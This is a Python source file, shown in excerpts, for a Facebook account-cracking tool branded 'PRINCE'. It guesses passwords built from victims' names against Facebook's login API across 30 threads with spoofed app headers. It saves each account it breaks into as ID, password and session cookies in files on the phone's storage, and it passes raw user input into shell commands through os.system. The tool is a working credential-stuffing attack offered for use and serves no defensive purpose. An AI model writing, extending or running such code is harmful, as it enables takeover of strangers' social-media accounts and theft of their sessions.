...
from concurrent.futures import ThreadPoolExecutor as BRANDPRINCE
from string import * 
...
sys.stdout.write('\x1b]2; PRINCE\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[33m【✪】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;32m【✪】Cʀᴇᴀᴛᴇᴅ Bʏ   ✯  👑 Diwash 👑   
\033[1;32m【✪】FB Gʀᴏᴜᴘ     ✯  DIWASH GYAWALI
\033[1;32m【✪】Oɴ Gɪᴛʜᴜʙ    ✯  DIWASHBRAND
...
def BRAND():   
    ...
    print(f'\033[1;32m[G]\033[1;32mJoin Facebook Group ')
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://facebook.com/groups/719941428943742/')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000234421275/')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        PRINCE(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {G}[PRINCE] {loop} | {Y}M1 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);PRINCEb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={PRINCEb};{ckkk}"
                    print(f"\r{R} [PRINCE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/PRINCE_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/PRINCE_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [PRINCE-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/PRINCE_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {G}[PRINCE] {loop} | {Y}M3 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [PRINCE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/PRINCE_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/PRINCE_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [PRINCE-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {G}[PRINCE] {loop} | {Y}M2 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {G}[PRINCE] {loop} | {Y}M4 {G}OK/{r}CP {len(oks)}/{len(cps)} | {G}{'{:.0%}'.format(loop/float(len(self.id)))}{G}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [PRINCE-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/PRINCE_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with BRANDPRINCE(max_workers=30) as PRINCEworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                PRINCEworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                PRINCEworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                PRINCEworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                PRINCEworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/PRINCE.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/PRINCE.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    PRINCE = input('Put File Name :')
    print(" ")
    BRAND = input('Saving Put File Name :')
    os.system('touch ' +BRAND)
    os.system('sort -r '+PRINCE+' | uniq > '+BRAND)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + PRINCE )
    print(47*'-')
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/PRINCE.txt\n') 
        filepath = input("Put File Name: ")
